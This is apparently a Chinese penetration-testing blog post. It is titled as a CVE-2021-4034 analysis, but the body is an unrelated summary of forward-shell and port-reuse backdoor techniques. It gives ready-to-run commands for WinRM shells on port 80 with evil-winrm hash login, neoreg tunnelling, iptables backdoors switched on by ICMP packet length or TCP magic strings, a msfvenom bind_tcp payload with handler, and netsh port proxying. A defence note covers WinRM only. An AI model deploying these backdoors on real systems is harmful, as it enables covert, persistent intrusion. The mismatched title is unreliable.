# 深入分析 CVE-2021-4034 及漏洞复现 - 白鹭鹭鹭 - 博客园

> 原文：[`www.cnblogs.com/slll/p/15905362.html`](https://www.cnblogs.com/slll/p/15905362.html)

正向 shell 总结

## 一.winrm，http.sys(端口复用)

### 介绍

winrm

```
WinRM 全称是 Windows Remote Management，是微软服务器硬件管理功能的一部分，能够对本地或远程的服务器进行管理。WinRM 服务能够让管理员远程登录 Windows 操作系统，获得一个类似 Telnet 的交互式命令行 shell，而底层通讯协议使用的是 HTTP。 
```

HTTP.sys

```
HTTP.sys 驱动是 IIS 的主要组成部分，主要负责 HTTP 协议相关的处理，它有一个重要的功能叫 Port Sharing，即端口共享。所有基于 HTTP.sys 驱动的 HTTP 应用可以共享同一个端口，只需要各自注册的 url 前缀不一样即可。 
```

winrm 默认监听端口：

```
5985 http
5986 https 
```

### 利用场景及其限制

1.  目标机器开启 winrm 服务
2.  目标机器是 win server，windows 主机不行
3.  目标机器 winrm 没有白名单(一旦白名单 ip 是无法登录的)
4.  组合 HTTP.sys 驱动自带的端口复用功能
5.  必须要知道明文密码(也可以使用 hash 传递)

### 靶机配置

```
开启 winrm 服务，并且监听 80 端口
winrm quickconfig -q
winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}
winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"} 
```

### 本地配置

```
winrm quickconfig -q
winrm set winrm/config/Client @{TrustedHosts="*"} 
```

### 执行命令

```
winrs -r:http://www.baidu.com -u:administrator -p:Passw0rd whoami
执行命令是 cmd 即可进行 shell

winrm invoke create wmicimv2/win32_process -SkipCAcheck-skipCNcheck @{commandline="calc.exe"} -r:DC.whoamianony.org
可以在远程主机启动计算器

Invoke-Command-ComputerName 192.168.198.129 -Credential root -Command {ipconfig}
# Invoke-Command -ComputerName [host] -Credential [user] -Command {[command]}
# Invoke-Command -ComputerName [host] -Credential [user] -ScriptBlock {[command]} 
```

### HASH 登录

项目地址：

```
https://github.com/Hackplayers/evil-winrm 
```

使用方法：

```
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/' 
```

### 错误以及其他问题解决

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123093859-3ccd5b52-7bed-1.png)

```
原因：仅仅支持 server，不支持 windows 
```

*   UAC 问题

    ```
    WinRM 服务也是受 UAC 影响的，所以本地管理员用户组里面只有 administrator 可以登录，其他管理员用户是没法远程登录 WinRM 的。要允许本地管理员组的其他用户登录 WinRM，需要修改注册表设置。

    reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f 
    ```

*   在已有 WinRM 服务的情况下，对于非 80 端口的 web 服务要如何处理

    ```
    把监听改成某非 80 端口，然后有别的需要可以端口转发 
    ```

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123093929-4eaee368-7bed-1.png)

```
执行 chcp 437 即可解决
  原因是：chcp 不同导致的 
```

### 防御手段

*   设置主机白名单，仅允许某些可信的计算机连接到 WinRM 服务器。
*   严格限制，确保仅允许本地管理组和 `WinRMRemoteWMIUsers__` 组中的用户有权使用 WinRM。

## 二.HTTP Server API

本程序利用 HTTP.sys 官方接口，向该驱动注册 url 前缀，与 IIS 共享端口，从而实现后门功能。

项目地址：

```
https://github.com/Reuodut/Windows-Hack-Code 
```

## 三.reGeorg

项目地址：

```
https://github.com/L-codes/neoreg 
```

### 1.生成密码

```
python neoreg.py generate -k password 
```

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123094027-7128d6b0-7bed-1.png)

### 2.上传

### 3.本地开启代理

```
python neoreg.py -k password -u "http://192.168.198.129/tunnel.php" 
```

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123094131-971a5218-7bed-1.png)

本地的 1080 端口即可访问

### 4.代理

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123094153-a46cb24e-7bed-1.png)

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123094220-b4368c40-7bed-1.png)

## 四.iptables 复用

### iptables 基础

```
sudo iptables -L -v --line-number
查看 iptables 的条目

sudo iptables -D INPUT 1
删除 iptables 条目

重启计算机的时候
iptables 自动清除 
```

### 条件

如果目标严格禁止仅仅开放 80 端口，我们就需要把 80 的 ssh 流量转发到 22 的 ssh

### 实验环境

```
kali:192.168.198.134

ubuntu:192.168.198.133
80 端口开放 
```

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123094240-c020e028-7bed-1.png)

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123094317-d668b270-7bed-1.png)

### 1.根据源地址做端口复用

```
iptables -t nat -A PREROUTING -p tcp -s 192.168.198.134 --dport 80 -j REDIRECT --to-port 22

将从 kali 访问的 80 端口的流量重定向到 22 端口 
```

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123094337-e233b10e-7bed-1.png)

#### 问题

别的师傅说因为所有的流量都转发到了 22，所以正常访问 80 端口会访问不了，但是经过我的实际测试，我用的 python 开启的 http 服务，连接 80 端口的 ssh 的时候，也是可以正常访问的。

不限制访问 ip

### 2.根据源地址做端口的访问(限制源 IP)

```
iptables -t nat -A PREROUTING -p tcp -s 192.168.198.134 --sport 33333 --dport 80 -j REDIRECT --to-port 22

只有 192.168.198.134(kali)的 33333 端口访问 80 的流量会被转发到 22 端口去 
```

```
nohup socat tcp-listen:44444,fork,reuseaddr tcp:192.168.198.133:80,sourceport=33333,reuseaddr &
ssh -p 44444 cmrex@127.0.0.1

我们把本地 44444 端口转发到 33333 端口，然后我们访问本地的 44444 端口 
```

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123094356-edd78896-7bed-1.png)

#### 问题

如果想要多开几个 ssh 连接，我们只需要把端口再转发几个就行了

### 3.利用 icmp 做开关

```
iptables -t nat -N LETMEIN
#创建端口复用链

iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22
#创建端口复用规则，将流量转发至 22 端口

iptables -t nat -A PREROUTING -p icmp --icmp-type 8 -m length --length 1139 -m recent --set --name letmein --rsource -j ACCEPT
#开启开关，如果接收到一个长为 1139 的 ICMP 包，则将来源 IP 添加到加为 letmein 的列表中

iptables -t nat -A PREROUTING -p icmp --icmp-type 8 -m length --length 1140 -m recent --name letmein --remove -j ACCEPT
#关闭开关，如果接收到一个长为 1140 的 ICMP 包，则将来源 IP 从 letmein 列表中去掉

iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN
#如果发现 SYN 包的来源 IP 处于 letmein 列表中，将跳转到 LETMEIN 链进行处理，有效时间为 3600 秒 
```

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123094420-fbab8120-7bed-1.png)

```
开启复用
ping -c 1 -s 1111 192.168.198.133
#向目标发送一个长度为 1111 的 ICMP 数据包（加上包头 28，总长度实际为 1139）

关闭复用
ping -c 1 -s 1112 192.168.198.133
#向目标发送一个长度为 1112 的 ICMP 数据包（加上包头 28，总长度实际为 1140） 
```

开启：

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123094438-06c26f42-7bee-1.png)

关闭：

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123094458-124aa1b8-7bee-1.png)

#### 问题

如果网络中禁止 ping，或者没有 ping，则无法利用

### 4.利用 TCP 协议做开关

ubuntu 中：

```
iptables -t nat -N LETMEIN
#创建端口复用链

iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22
#创建端口复用规则，将流量转发至 22 端口

iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT
#开启开关，如果接收到一个含有 threathuntercoming 的 TCP 包，则将来源 IP 添加到加为 letmein 的列表中

iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT
#关闭开关，如果接收到一个含有 threathunterleaving 的 TCP 包，则将来源 IP 从 letmein 的列表中移除

iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN
#如果发现 SYN 包的来源 IP 处于 letmein 列表中，将跳转到 LETMEIN 链进行处理，有效时间为 3600 秒 
```

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123094520-1f90037c-7bee-1.png)

kali 中：

```
开启复用，开启后本机到目标 80 端口的流量将转发至目标的 SSH
echo threathuntercoming | socat - tcp:192.168.198.133:80

关闭复用，关闭后，80 恢复正常：
echo threathunterleaving | socat - tcp:192.168.198.133:80 
```

开启连接：

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123094537-29c5edde-7bee-1.png)

关闭连接：

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123094556-34e1376e-7bee-1.png)

#### 问题

待续

## 五.msf 正向 shell

### 1.生成

```
msfvenom -p windows/meterpreter/bind_tcp -f exe LPORT=80 -o shell.exe

//从目标的 80 端口出来 
```

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123094616-41117d1e-7bee-1.png)

### 2.监听连接

```
use exploit/multi/handler
set payload windows/meterpreter/bind_tcp
run 
```

### 3.结果

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123094635-4c44a7e2-7bee-1.png)

成功正向连接

web 日志：

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123094653-57510590-7bee-1.png)

## 六.netsh

假定需要通过 192.168.198.133 的 3389 端口转 80 端口，则需要在 192.168.198.133 主机的命令行输入如下语句：

```
netsh interface portproxy add v4tov4 listenport=80 listenaddress=192.168.198.129 connectport=3389 connectaddress=192.168.198.129 
```

```
netsh interface portproxy show all

删除：
netsh interface portproxy delete v4tov4 listenport=80 listenaddress=192.168.198.129 
```

## 七.冰蝎正向后门代理流量

冰蝎有自带的正向流量代理工具

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123094712-626c4fb6-7bee-1.png)

箭头所指处填写

```
0.0.0.0
和
本地要监听的流量代理端口即可 
```

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123094730-6cded39c-7bee-1.png)

## 八.蚁剑反弹 shell 配合 msf

需要用到蚁剑的插件：AS-exploit

![image](https://xzfile.aliyuncs.com/media/upload/picture/20220123094745-76581ce4-7bee-1.png)